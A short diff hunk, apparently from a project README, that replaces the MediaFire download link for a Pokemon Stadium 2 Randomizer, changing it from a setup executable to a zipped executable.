@@ -15,4 +15,4 @@ NOTE:
 
 
 # Download
-https://download1581.mediafire.com/m7ufo33fqdhg/49otctbiq7s7cjr/Pokemon+Stadium+2+Randomizer+Setup.exe
+https://download1646.mediafire.com/bhmozi9v358g/9er09nfyh17776a/Pokemon+Stadium+2+Randomizer.exe.zip
